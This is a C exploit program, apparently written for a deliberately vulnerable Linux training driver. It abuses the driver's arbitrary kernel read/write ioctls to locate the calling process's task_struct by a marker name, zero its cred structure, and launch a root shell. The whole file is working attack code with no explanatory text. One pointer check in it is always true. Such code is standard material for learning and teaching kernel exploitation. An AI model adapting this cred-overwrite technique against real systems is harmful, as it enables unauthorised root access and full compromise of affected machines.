#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <sys/prctl.h>

#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM,0)
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"
#define START_ADDR 0xffff880000000000
#define END_ADDR 0xffffc80000000000

struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};

int read_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args2;
	struct read_args r_args;
	int ret;

	s_args2.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
	r_args.buff=buff;
	r_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
	return ret;
}
int write_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args1;
	struct write_args w_args;
	int ret;

	s_args1.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
	w_args.buff=buff;
	w_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
	return ret;
}

int main()
{
	int fd=-1;
	int result=0;
	struct init_args i_args;
	struct realloc_args rello_args;
	size_t real_cred=0;
	size_t cred=0;
	size_t target_addr;
	int root_cred[12];

	setvbuf(stdout, 0LL, 2, 0LL);
	char *buf=malloc(0x1000);
	char target[16];

	strcpy(target,"try2findmesauce");
	prctl(PR_SET_NAME,target);
	fd=open(PATH,O_RDWR);
	if (fd<0){
		puts("[-] open error ! \n");
		exit(-1);
	}
	//  爆破出 cred地址
	i_args.size=0x100;
	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
	rello_args.grow=0;
	rello_args.size=0x100+1;
	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
	puts("[+] We can read and write any memory! [+]");
	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
	{
		read_mem(fd,addr,buf,0x1000);
		result=memmem(buf,0x1000,target,16);
		if (result)
		{
			printf("[+] Find try2findmesauce at : %p\n",result);
			cred=*(size_t *)(result-0x8);
			real_cred=*(size_t *)(result-0x10);
			if ((cred || 0xff00000000000000) && (real_cred == cred))
			{
				target_addr=addr+result-(long int)(buf);
				printf("[+] found task_struct 0x%x\n",target_addr);
				printf("[+] found cred 0x%lx\n",real_cred);
				break;
			}
		}
	}
	if (result==0)
	{
		puts("[-] not found, try again! \n");
		exit(-1);
	}
	// 修改cred
	memset((char *)root_cred,0,28);
	write_mem(fd,cred,root_cred,28);

	if (getuid()==0)
	{
		printf("[+] Now you are r00t, enjoy your shell\n");
		system("/bin/sh");
	}
	else
	{
		puts("[-] There are something wrong!\n");
		exit(-1);
	}
	return 0;
}
/*



*/
